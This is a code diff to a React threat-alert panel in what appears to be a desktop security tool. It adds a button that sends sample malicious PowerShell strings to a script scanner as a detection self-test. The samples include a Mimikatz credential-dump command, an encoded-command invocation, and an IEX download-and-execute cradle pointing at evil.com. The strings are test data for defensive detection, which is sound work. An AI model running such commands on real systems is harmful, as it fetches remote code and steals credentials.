@@ -8,7 +8,7 @@
  */
 
 import React, { useState, useEffect, useCallback } from 'react';
-import { getThreatAlerts, getAdvancedDetectionStats } from '../services/tauriApi';
+import { getThreatAlerts, getAdvancedDetectionStats, scanScript } from '../services/tauriApi';
 import '../styles/components/threat-alert-panel.css';
 
 // Severity icons and colors
@@ -49,6 +49,37 @@ function ThreatAlertPanel({
     const [loading, setLoading] = useState(true);
     const [error, setError] = useState(null);
     const [expandedAlert, setExpandedAlert] = useState(null);
+    const [testing, setTesting] = useState(false);
+    const [testResult, setTestResult] = useState(null);
+
+    // Test detection với malicious scripts
+    const testDetection = async () => {
+        setTesting(true);
+        setTestResult(null);
+
+        const testScripts = [
+            { content: 'Invoke-Mimikatz -DumpCreds', type: 'powershell' },
+            { content: '[System.Convert]::FromBase64String($encoded)', type: 'powershell' },
+            { content: 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com")', type: 'powershell' },
+            { content: 'powershell -EncodedCommand JABzAD0A', type: 'powershell' },
+        ];
+
+        try {
+            let detected = 0;
+            for (const script of testScripts) {
+                const result = await scanScript(script.content, script.type);
+                if (result.should_block) detected++;
+                console.log(`[Test] ${script.content.substring(0, 30)}... → ${result.threat_level}`);
+            }
+            setTestResult(`Detected ${detected}/${testScripts.length} threats!`);
+            // Refresh sau khi test
+            setTimeout(fetchAlerts, 500);
+        } catch (err) {
+            setTestResult(`Error: ${err.message}`);
+        } finally {
+            setTesting(false);
+        }
+    };
 
     // Fetch alerts
     const fetchAlerts = useCallback(async () => {
@@ -267,6 +298,14 @@ function ThreatAlertPanel({
                     <span className="alert-count">
                         {alerts.length} alerts
                     </span>
+                    <button
+                        className="test-btn"
+                        onClick={testDetection}
+                        disabled={testing}
+                        title="Test Detection"
+                    >
+                        {testing ? 'Testing...' : '🧪 Test'}
+                    </button>
                     <button className="refresh-btn" onClick={fetchAlerts} title="Refresh">
                         <svg viewBox="0 0 24 24" fill="currentColor">
                             <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z" />
@@ -274,6 +313,12 @@ function ThreatAlertPanel({
                     </button>
                 </div>
             </div>
+
+            {testResult && (
+                <div className={`test-result ${testResult.includes('Error') ? 'error' : 'success'}`}>
+                    {testResult}
+                </div>
+            )}
 
             {showStats && renderStats()}
 
